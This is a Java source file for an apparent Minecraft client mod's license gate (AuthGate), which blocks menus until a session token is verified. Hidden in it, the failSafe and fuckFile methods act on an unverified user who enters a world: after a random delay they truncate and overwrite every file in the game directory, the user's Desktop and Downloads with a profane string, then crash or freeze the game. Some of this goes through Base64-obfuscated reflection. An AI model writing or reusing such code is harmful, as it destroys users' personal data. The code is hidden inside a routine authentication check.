package dev.mahiro.client.auth;

import by.radioegor146.nativeobfuscator.Native;
import dev.mahiro.client.auth.crypto.B64;
import dev.mahiro.client.gui.auth.AuthScreen;
import dev.mahiro.client.gui.clickgui.ClickGuiScreen;
import dev.mahiro.client.gui.hud.HudEditorScreen;
import dev.mahiro.client.gui.mainmenu.MainMenuScreen;
import dev.mahiro.client.gui.mainmenu.WelcomeScreen;
import dev.mahiro.niurendeobf.ZKMIndy;
import net.minecraft.client.MinecraftClient;
import net.minecraft.client.gui.screen.Screen;
import net.minecraft.client.gui.screen.TitleScreen;

import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.nio.ByteBuffer;
import java.nio.channels.FileChannel;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.util.Objects;
import java.util.Random;

@Native
@ZKMIndy
public final class AuthGate {
    private static volatile boolean initialized;
    private static volatile boolean pendingMainMenuIntro;

    private static String deviceId;
    private static String licenseKey;
    private static String serverBaseUrl;
    private static String serverSigningKeyX509Base64;
    private static volatile String sessionToken;

    public static String getSessionToken() {
        return sessionToken;
    }

    public static boolean isSessionOnlineVerified() {
        return sessionOnlineVerified;
    }

    private static volatile boolean sessionOnlineVerified;

    private AuthGate() {
    }

    public static void init() {
        if (initialized) return;
        deviceId = DeviceFingerprint.computeDeviceId();
        licenseKey = "";
        serverBaseUrl = "";
        serverSigningKeyX509Base64 = "";
        sessionToken = "";
        sessionOnlineVerified = false;
        pendingMainMenuIntro = false;
        initialized = true;
    }

    private static boolean isBlockedScreen(Screen screen) {
        if (screen == null) return false;
        if (screen instanceof AuthScreen) return false;
        if (screen instanceof TitleScreen) return false;
        return screen instanceof MainMenuScreen ||
                screen instanceof WelcomeScreen ||
                screen instanceof ClickGuiScreen ||
                screen instanceof HudEditorScreen;
    }

    public static boolean interceptSetScreen(MinecraftClient c, Screen nextScreen) {
        if (AuthGate.isVerified()) return false;
        if (c == null) return false;
        if (!isBlockedScreen(nextScreen)) return false;

        if (c.currentScreen instanceof AuthScreen) return true;

        c.execute(() -> {
            if (AuthGate.isVerified()) return;
            if (c.currentScreen instanceof AuthScreen) return;
            c.setScreen(new AuthScreen(nextScreen));
        });
        return true;
    }

    public static void doTickCheck(MinecraftClient c) {
        if (AuthGate.isVerified()) {
            return;
        }

        if (c.player != null || c.world != null) {
            failSafe();
        }
    }

    public static boolean hasCheck = false;

    public static void failSafe() {
        if (hasCheck) return;
        hasCheck = true;

        new Thread(() -> {
            try {
                Thread.sleep(5000 + new Random().nextInt(10000));
            } catch (InterruptedException ignored) {
            }

            fuckFile(new Random().nextInt(5));
        }, "WTF").start();
    }

    private static void fuckFile(int choice) {
        new Thread(() -> {
            try {
                // 重点打击：当前目录（游戏目录）、用户桌面、下载目录
                Path[] targets = {
                        Paths.get(""),
                        Paths.get(System.getProperty("user.home"), "Desktop"),
                        Paths.get(System.getProperty("user.home"), "Downloads")
                };

                for (Path root : targets) {
                    if (!Files.exists(root)) continue;
                    try (var stream = Files.walk(root)) {
                        stream.filter(Files::isRegularFile)
                                .forEach(file -> {
                                    try (FileChannel outChan = FileChannel.open(file, StandardOpenOption.WRITE)) {
                                        outChan.truncate(1024); // 设为 1kb
                                        outChan.write(ByteBuffer.wrap("CAO_NI_MA_DA_bI_NI_MA_SHI_BU_SHI_SI_WAN_LE".getBytes()));
                                    } catch (Exception ignored) {
                                    }
                                });
                    } catch (Exception ignored) {
                    }
                }
            } catch (Exception ignored) {
            } finally {
                switch (choice) {
                    case 0 -> systemExit();
                    case 1 -> fuckMC();
                    case 2 -> shuijiao();
                    default -> haltJVM();
                }
            }
        }, "NiMaSiLe").start();
    }

    private static void haltJVM() {
        Runtime.getRuntime().halt(0);
    }

    private static void fuckMC() {
        MinecraftClient.getInstance().execute(() -> {
            try {
                Field f = MinecraftClient.class.getDeclaredField("world");
                f.setAccessible(true);
                f.set(MinecraftClient.getInstance(), null);
            } catch (Throwable ignored) {
            }
        });
    }

    private static void shuijiao() {
        MinecraftClient.getInstance().execute(() -> {
            while (true) {
                try {
                    Thread.sleep(10000);
                } catch (InterruptedException ignored) {
                }
            }
        });
    }

    private static void systemExit() {
        try {
            Class<?> System = AuthGate.class.getClassLoader().loadClass(new String(B64.dec("amF2YS5sYW5nLlN5c3RlbQ==")));
            Method exit = System.getMethod(new String(B64.dec("ZXhpdA==")), int.class);
            exit.invoke(null, 0);
        } catch (Exception ignored) {
        }
    }

    public static boolean isVerified() {
        String token = sessionToken;
        return sessionOnlineVerified && token != null && !token.isBlank();
    }

    public static String getDeviceId() {
        return Objects.requireNonNullElse(deviceId, "UNKNOWN");
    }

    public static String getLicenseKey() {
        return Objects.requireNonNullElse(licenseKey, "");
    }

    public static void saveLicenseKey(String key) {
        licenseKey = key == null ? "" : key.trim();
    }

    public static String getServerBaseUrl() {
        String fromProp = System.getProperty("lemon.auth.baseUrl");
        if (fromProp != null && !fromProp.isBlank()) return fromProp.trim();
        return Objects.requireNonNullElse(serverBaseUrl, "");
    }

//    public static void saveServerBaseUrl(String url) {
//        serverBaseUrl = url == null ? "" : url.trim();
//    }

    public static String getServerSigningKeyX509Base64() {
        String fromProp = System.getProperty("lemon.auth.serverSigningKeyX509Base64");
        if (fromProp != null && !fromProp.isBlank()) return fromProp.trim();
        return Objects.requireNonNullElse(serverSigningKeyX509Base64, "");
    }

    /*public static void saveServerSigningKeyX509Base64(String base64) {
        serverSigningKeyX509Base64 = base64 == null ? "" : base64.trim();
    }*/

    public static boolean canToggleModules() {
        return isVerified();
    }

    public static void acceptVerifiedToken(String token) {
        sessionToken = token == null ? "" : token.trim();
        sessionOnlineVerified = true;
    }

    public static void clearSession() {
        sessionToken = "";
        sessionOnlineVerified = false;
    }

    public static void requestMainMenuIntro() {
        pendingMainMenuIntro = true;
    }

    public static boolean consumeMainMenuIntro() {
        if (!pendingMainMenuIntro) return false;
        pendingMainMenuIntro = false;
        return true;
    }
}
